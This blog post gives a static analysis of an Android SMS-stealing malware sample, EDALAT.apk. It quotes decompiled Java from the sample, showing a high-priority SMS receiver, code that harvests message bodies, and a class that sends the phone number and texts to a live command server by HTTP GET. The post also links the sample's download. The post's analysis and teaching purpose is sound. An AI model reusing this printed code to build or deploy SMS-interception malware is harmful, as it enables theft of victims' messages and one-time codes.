---
layout: post
title: # Android Malware Analysis Series - EDALAT.apk - Part 2.1
---

**File Information:** [?](https://twitter.com/malwrhunterteam/status/1534958788096233472?s=20&t=OAEC5DdvJDvRp6SRsaaUaw)?? Not sure appears Iranian in origin ???

**Sample Source:** [https://bazaar.abuse.ch/download/355cd2b71db971dfb0fac1fc391eb4079e2b090025ca2cdc83d4a22a0ed8f082/](https://bazaar.abuse.ch/download/355cd2b71db971dfb0fac1fc391eb4079e2b090025ca2cdc83d4a22a0ed8f082/) 

**SHA256 Hash:** 
**355cd2b71db971dfb0fac1fc391eb4079e2b090025ca2cdc83d4a22a0ed8f082**

## Introduction

In this second post in the Android malware analysis series I will be documenting my process for static and dynamic analysis of the `EDALAT.apk`. Part one of 2.1 will document the static analysis process and go over the permissions, classes, methods, and communications on a source code level. Part 2.2 will dive into the dynamic analysis process, using various `frida` scripts, analyzing the file system, and using various automated tools to detect the behavior of this sample. 

# Decompilation and Static Analysis

## Manifest.xml file

### Permissions

Below are the permissions associated with the malware. This specific application appears to be accessing `READ_SMS` and `RECEIVE_SMS` among other permissions.

```xml
		<uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.RECEIVE_SMS"/>
    <uses-permission android:name="android.permission.READ_SMS"/>
```

### Components

In the manifest file we see 3 main components. Two activities and one receiver. Each is designated to a different functionality inside the malware. Which we will see later on in this post.

```xml
<application android:theme="@style/AppTheme" android:label="@string/app_name" android:icon="@mipmap/ic_launcher" android:allowBackup="true" android:supportsRtl="true" android:usesCleartextTraffic="true" android:networkSecurityConfig="@xml/network_security_config" android:roundIcon="@mipmap/ic_launcher_round" android:appComponentFactory="androidx.core.app.CoreComponentFactory">
        <receiver android:name="ir.siqe.holo.MyReceiver" android:enabled="true" android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>
        <activity android:name="ir.siqe.holo.MainActivity2"/>
        <activity android:name="ir.siqe.holo.MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
    </application>
```

## `MainActivity` Class

In the `MainActivity` class of package `ir.siqe.holo` we can see the application implementing a few calls that attempt to identify the phone number, creating a file in the shared preferences directory the stores the string info, and then going through a series of checks on the phone number. If the phone does not match the specific country code it displays the following error. 

```java
[TRUNCATED]
public class MainActivity extends AppCompatActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(realrat.siqe.holo.R.layout.activity_main);
        final SharedPreferences.Editor edit = getSharedPreferences("info", 0).edit();
        final EditText editText = (EditText) findViewById(realrat.siqe.holo.R.id.idetify_phone);
        findViewById(realrat.siqe.holo.R.id.go).setOnClickListener(new View.OnClickListener() { // from class: ir.siqe.holo.MainActivity.1
            @Override // android.view.View.OnClickListener
            public void onClick(View view) {
                if (!editText.getText().toString().matches("(\\+98|0)?9\\d{9}")) {
                    Toast.makeText(MainActivity.this, "شماره موبایل معتبر نیست", 0).show();
                    return;
                }
[TRUNCATED]
```

![Untitled](Android%20Malware%20Analysis%20Series%20-%20Part%202%201%20547625440966404b80b0a668a5d940af/Untitled.png)

Once done it attempts to ask the user for specific permissions to `RECIEVE_SMS` to the android device. It obtains the phone number string and starts the `MainActivity2` class. 

```java
[TRUNCATED]
ActivityCompat.requestPermissions(MainActivity.this, new String[]{"android.permission.RECEIVE_SMS"}, 0);
                if (Integer.valueOf(ActivityCompat.checkSelfPermission(MainActivity.this, "android.permission.RECEIVE_SMS")).intValue() == 0) {
                    edit.putString("phone", editText.getText().toString());
                    edit.commit();
                    new connect(editText.getText().toString(), "تارگت جدید نصب کرد", MainActivity.this);
                    MainActivity.this.startActivity(new Intent(MainActivity.this, MainActivity2.class));
                }
            }
        });
    }
}
```

### `MainActivity2` Class

After the activity gets loaded from `MainActivity` we can see a new `webview` is created which loads the malware URLs below. 

```java
public class MainActivity2 extends AppCompatActivity {
    /* JADX INFO: Access modifiers changed from: protected */
    @Override // androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity
    public void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        setContentView(realrat.siqe.holo.R.layout.web);
        WebView webView = (WebView) findViewById(realrat.siqe.holo.R.id.webview);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.setWebViewClient(new mWebViewClient());
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setLoadWithOverviewMode(true);
        webView.getSettings().setUseWideViewPort(true);
        webView.loadUrl("https://eblaqie.org/pishgiri");
    }
[TRUNCATED]
```

We can see the malware uses multiple APIs including one `setLoadWithOverviewMode` which auto-adjusts and fit to the Android devices screen size. 

[https://developer.android.com/reference/android/webkit/WebSettings#setLoadWithOverviewMode(boolean)](https://developer.android.com/reference/android/webkit/WebSettings#setLoadWithOverviewMode(boolean))

### `MyReceiver` Class

If we jump back to the `AndroidManifest.xml` file we can see a receiver with an intent filter set to a high priority. This is indicative of malware behavior especially in the case with features that authors try to mask, such as sending and receiving SMS. 

[https://developer.android.com/guide/topics/manifest/intent-filter-element#priority](https://developer.android.com/guide/topics/manifest/intent-filter-element#priority)

```xml
[TRUNCATED]
        <receiver android:name="ir.siqe.holo.MyReceiver" android:enabled="true" android:exported="true">
            <intent-filter android:priority="1000">
                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>
            </intent-filter>
        </receiver>
[TRUNCATED]
```

Opening up the `MyReceiver` receiver we can see that the class is doing the bulk of the work for sms theft. The class is importing the core package functionality such as the utility class Bundle and SharedPreferences to pull and store data.

```java
package ir.siqe.holo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Bundle;
import android.telephony.SmsMessage;
[TRUNCATED]
```

The class is then implemented using the sharedPreferences context and os bundle. The shared_prefs file `info` is then being loaded into `sharedPreference` and then loading the interface editor to later read and edit the `info` file. On the next line the Bundle util is being called and creating an empty variable with the ability to store and retrieve data.

Skipping to the `String str` line we can see that the malware is attempting to grab the flavor of the android device from the `BuildConfig` class using `com.androidnetworking` package. This may be to determine whether the device is a debug or release build.

```java
[TRUNCATED]
/* loaded from: classes.dex */
public class MyReceiver extends BroadcastReceiver {
    @Override // android.content.BroadcastReceiver
    public void onReceive(Context context, Intent intent) {
        SharedPreferences sharedPreferences = context.getSharedPreferences("info", 0);
        SharedPreferences.Editor edit = sharedPreferences.edit();
        Bundle extras = intent.getExtras();
        String str = com.androidnetworking.BuildConfig.FLAVOR;
[TRUNCATED]
```

The next chunk of code in the `MyReceiver` class runs a series of if statements, the later two which I have pulled from my example. The first if statement checks if the `extras` variable is equal to null. If it is not equal to null then it places the extras variable from Bundle and reads the PDUs (Protocol Data Unit) or users sms messages. Placing the pdus into an array called `SmsMessage`. Storing the messages line by line into a new `str` variable and creating a new line break.

Lastly the class connect is called and obtains the string details from the `sharedPreference`  called earlier. Specifically the `str` and `context` or messages and phone number they are from. 

```java
	[TRUNCATED]
        if (extras != null) {
            Object[] objArr = (Object[]) extras.get("pdus");
            int length = objArr.length;
            SmsMessage[] smsMessageArr = new SmsMessage[length];
            for (int i = 0; i < length; i++) {
                smsMessageArr[i] = SmsMessage.createFromPdu((byte[]) objArr[i]);
                str = ((str + "\r\n") + smsMessageArr[i].getMessageBody().toString()) + "\r\n";
            }
        }
[TRUNCATED]
        new connect(sharedPreferences.getString("phone", "0"), str, context);
    }
}
```

Read more here on PDUs: [https://en.wikipedia.org/wiki/Protocol_data_unit](https://en.wikipedia.org/wiki/Protocol_data_unit) 

Lastly the `MyReceiver` class calls the connection class via the `new` operator. Instantiating it in memory.

### `connect` Class

Tracing the `new` operator to the `connect` class we can see the use of various utils in the code snippet below. 

```java
[TRUNCATED]
import android.content.Context;
import android.content.SharedPreferences;
import android.util.Log;
import com.androidnetworking.AndroidNetworking;
import com.androidnetworking.error.ANError;
import com.androidnetworking.interfaces.JSONArrayRequestListener;
import org.json.JSONArray;
[TRUNCATED]
```

The initial class call below for connect deploying various strings, contexts and preferences. 

```java
[TRUNCATED] 
/* loaded from: classes.dex */
public class connect {
    Context context;
    SharedPreferences preferences;
    String url;
[TRUNCATED]
```

Three in particular which are core to this class are the `Log`, `SharedPreferences` and `JSONArray`. Log appears to be left over logging for the malware developer and the two other appear to be pulling data from the SharedPreferences from the prior class and loading that data into a JSON array. 

```java

[TRUNCATED]
    public connect(final String str, final String str2, Context context) {
        this.url = str;
        this.context = context;
        AndroidNetworking.initialize(context);
        AndroidNetworking.get("https://eblaqie.org/ratsms.php?phone=" + str + "&info=" + str2).build().getAsJSONArray(new JSONArrayRequestListener() { // from class: ir.siqe.holo.connect.1
            @Override // com.androidnetworking.interfaces.JSONArrayRequestListener
            public void onResponse(JSONArray jSONArray) {
            }

            @Override // com.androidnetworking.interfaces.JSONArrayRequestListener
            public void onError(ANError aNError) {
                Log.i("==================", "erroeererewrwerwer");
                AndroidNetworking.get("https://google.com" + str + "&info=" + str2).build().getAsJSONArray(new JSONArrayRequestListener() { // from class: ir.siqe.holo.connect.1.1
                    @Override // com.androidnetworking.interfaces.JSONArrayRequestListener
                    public void onResponse(JSONArray jSONArray) {
                    }

                    @Override // com.androidnetworking.interfaces.JSONArrayRequestListener
                    public void onError(ANError aNError2) {
                        Log.i("==================", "erroeererewrwerwer");
                    }
                });
            }
        });
    }
}
```

This JSON data which is comprised of the data sent from our initial `MyReceiver` class `onReceive` method `str` and `context` are loaded into the `connect` method and sent to the malicious server [https://eblaqie.org](https://eblaqie.org) via AndroidNetworking.get ([https://github.com/amitshekhariitbhu/Fast-Android-Networking](https://github.com/amitshekhariitbhu/Fast-Android-Networking)).

This concludes part 2.1 I will be slowly updating my blog adding Android malware analysis guides in the future. 

~ n0ps

###